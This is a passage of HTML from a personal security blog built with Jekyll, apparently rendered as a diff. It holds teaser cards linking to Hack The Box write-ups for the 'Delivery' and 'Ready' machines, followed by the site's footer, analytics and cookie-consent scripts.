+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-fw fa-clock" aria-hidden="true"></i>
+        
+          8 minute read
+        
+      </span>
+    
+
+
+      <!-- Start Read in other languages-->
+        <span class="page__meta-sep page__meta-lang"></span>
+        
+        
+        
+        <span class="page__meta-lang"><a href="/writeup/2021/04/htb-time/">Leia também em  <img class="emoji" title=":brazil:" alt=":brazil:" src="https://github.githubassets.com/images/icons/emoji/unicode/1f1e7-1f1f7.png" height="20" width="20"></a></span>
+        
+
+        
+
+        
+
+        
+        
+        
+        
+      <!-- End Read in other languages-->
+      <span class="page__meta-sep page__meta-share"></span>
+      <span class="page__meta-share">
+        <i class="fas fa-share-alt" aria-hidden="true"></i>
+        <a href="#sharelinks">Share</a>
+      </span>
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">Hello guys!
+
+This week’s machine will be Delivery, another easy-rated machine from Hack The Box, created by ippsec.
+</p>
+  </article>
+</div>
+
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+      <div class="archive__item-teaser">
+        <img src="https://i.imgur.com/R2EVM1J.png" alt="">
+      </div>
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+      
+      
+      <a href="https://davicruz.com/en-US/writeup/2021/05/htb-ready/" rel="permalink">Hackthebox write-up: Ready
+</a>
+      
+      
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+      
+      <span class="page__meta-date">
+        <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i>
+        <time datetime="2021-05-15T13:00:00-03:00">May 15, 2021</time>
+      </span>
+    
+
+    <span class="page__meta-sep"></span>
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-fw fa-clock" aria-hidden="true"></i>
+        
+          6 minute read
+        
+      </span>
+    
+
+
+      <!-- Start Read in other languages-->
+        <span class="page__meta-sep page__meta-lang"></span>
+        
+        
+        
+        <span class="page__meta-lang"><a href="/writeup/2021/04/htb-time/">Leia também em  <img class="emoji" title=":brazil:" alt=":brazil:" src="https://github.githubassets.com/images/icons/emoji/unicode/1f1e7-1f1f7.png" height="20" width="20"></a></span>
+        
+
+        
+
+        
+
+        
+        
+        
+        
+      <!-- End Read in other languages-->
+      <span class="page__meta-sep page__meta-share"></span>
+      <span class="page__meta-share">
+        <i class="fas fa-share-alt" aria-hidden="true"></i>
+        <a href="#sharelinks">Share</a>
+      </span>
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">Hello guys!
+
+This week’s machine will be Ready, another median-rated machine from Hack The Box, created by bertolis.
+</p>
+  </article>
+</div>
+
+        
+      </div>
+    </div>
+  
+  
+</div>
+
+    </div>
+
+    
+      <div class="search-content">
+        <div class="search-content__inner-wrap">
+<form class="search-content__form" onkeydown="return event.key != 'Enter';">
+    <label class="sr-only" for="search">
+      Enter your search term...
+    </label>
+    <input type="search" id="search" class="search-input" tabindex="-1" placeholder="Enter your search term...">
+  </form>
+  <div id="results" class="results"></div>
+</div>
+
+      </div>
+    
+
+    <div id="footer" class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- Osano - consent -->
+<script src="https://cdn.jsdelivr.net/npm/cookieconsent@3/build/cookieconsent.min.js" data-cfasync="false"></script>
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+
+    
+    <li><strong>Follow:</strong></li>
+    
+
+    
+    
+    
+    <li><a href="https://www.linkedin.com/in/davicruz" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i> Linkedin</a></li>
+    
+    
+    
+    <li><a href="https://twitter.com/zerahzurc" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i> Twitter</a></li>
+    
+    
+    
+    <li><a href="https://github.com/davi-cruz" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub</a></li>
+    
+    
+    
+    <!-- Terms and Privacy -->
+    <li><a href="https://davicruz.com/en-US/terms-and-privacy/" rel="nofollow noopener noreferrer">
+        <i class="fas fa-user-shield" aria-hidden="true"></i> Terms of Service and Privacy Policy</a></li>
+    <!-- end Terms and Privacy -->
+    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+  </ul>
+</div>
+
+<!-- Start Read in other languages-->
+<div class="page__footer-follow">
+  <ul>
+    
+    
+    
+    <li><a href="https://davicruz.com">Disponível também em  <img class="emoji" title=":brazil:" alt=":brazil:" src="https://github.githubassets.com/images/icons/emoji/unicode/1f1e7-1f1f7.png" height="20" width="20"></a></li>
+    
+
+    
+
+    
+
+      
+      
+    
+      
+  </ul>
+</div>
+<!-- End Read in other languages-->
+
+<div class="page__footer-copyright">© 2021 Davi Cruz. Powered by <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp; <a href="https://mademistakes.com/work/minimal-mistakes-jekyll-theme/" rel="nofollow">Minimal Mistakes</a>.</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+
+
+
+
+<script src="/assets/js/lunr/lunr.min.js"></script>
+<script src="/assets/js/lunr/lunr-store.js"></script>
+<script src="/assets/js/lunr/lunr-en.js"></script>
+
+
+
+
+  <!-- start custom analytics snippet -->
+
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-54883666-1"></script>
+<script>
+  function EnableGTAGonConsent(){
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+    gtag('config', 'UA-54883666-1', { 'anonymize_ip': true});
+  }
+</script>
+
+<!-- Microsoft Clarity -->
+<script type="text/javascript">
+  function EnableMSClarityonConsent(){
+    (function(c,l,a,r,i,t,y){
+      c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
+      t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
+      y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
+  })(window, document, "clarity", "script", "5dnbfjo108");
+  }
+</script>
+
+<!-- end custom analytics snippet -->
+
+
+
+
+
+    <script>
+  'use strict';
+
+  (function() {
+    var commentContainer = document.querySelector('#utterances-comments');
+
+    if (!commentContainer) {
+      return;
+    }
+
+    var script = document.createElement('script');
+    script.setAttribute('src', 'https://utteranc.es/client.js');
+    script.setAttribute('repo', 'davi-cruz/davi-cruz.github.io');
+    script.setAttribute('issue-term', 'htb-time');
+    script.setAttribute('theme', 'github-dark');
+    script.setAttribute('crossorigin', 'anonymous');
+
+    commentContainer.appendChild(script);
+  })();
+</script>
+
+  
+
+
+
+
+    
+<!-- Cookie Consent Management -->
+<script>
+    var strMessage = "This website uses cookies to ensure you get the best experience";
+    var strDismiss = "Got it!";
+    var strAllow = "Allow cookies";
+    var strDeny = "No, thanks!";
+    var strLink = "Learn More";
+    var strHref = "https://davicruz.com/en-US/terms-and-privacy/";
+
+    window.cookieconsent.initialise({
+        "palette": {
+            "popup": {
+                "background": "#252e39"
+            },
+            "button": {
+                "background": "transparent",
+                "text": "#008288",
+                "border": "#008288"
+            }
+        },
+        "position": "bottom-left",
+        "type": "opt-in",
+        "content": {
+            "message": strMessage,
+            "dismiss": strDismiss,
+            "allow": strAllow,
+            "deny": strDeny,
+            "link": strLink,
+            "href": strHref
+        },
+        onInitialise: function (status) {
+            var type = this.options.type;
+            var didConsent = this.hasConsented();
+            if (type == 'opt-in' && didConsent) {
+                // enable cookies
+                EnableMSClarityonConsent();
+                EnableGTAGonConsent();
+            }
+            if (type == 'opt-out' && !didConsent) {
+                // disable cookies
+            }
+        },
+        onStatusChange: function (status, chosenBefore) {
+            var type = this.options.type;
+            var didConsent = this.hasConsented();
+            if (type == 'opt-in' && didConsent) {
+                // enable cookies
+                EnableMSClarityonConsent();
+                EnableGTAGonConsent();
+            }
+            if (type == 'opt-out' && !didConsent) {
+                // disable cookies
+            }
+        },
+        onRevokeChoice: function () {
+            var type = this.options.type;
+            if (type == 'opt-in') {
+                // disable cookies
+            }
+            if (type == 'opt-out') {
+                // enable cookies
+                EnableMSClarityonConsent();
+                EnableGTAGonConsent();
+            }
+        }
+    });
+</script>
+<!-- End of Cookie Consent Management -->
+
+  </body>
+</html>
